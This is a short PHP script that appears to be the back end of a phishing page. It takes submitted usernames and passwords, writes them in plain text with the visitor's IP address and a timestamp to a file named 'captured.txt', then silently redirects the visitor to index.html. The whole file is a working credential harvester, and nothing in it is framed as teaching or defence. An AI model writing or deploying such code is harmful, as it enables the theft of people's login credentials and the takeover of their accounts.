<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = 'captured.txt';
    $username = isset($_POST["username"]) ? $_POST["username"] : '';
    $password = isset($_POST["password"]) ? $_POST["password"] : '';
    $ip = $_SERVER["REMOTE_ADDR"];
    $time = date("Y-m-d H:i:s");

    $log = "[{$time}] IP: {$ip} | User: {$username} | Pass: {$password}\n";
    file_put_contents($file, $log, FILE_APPEND | LOCK_EX);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="refresh" content="0;url=index.html" />
</head>
<body>
  Redirecting...
</body>
</html>
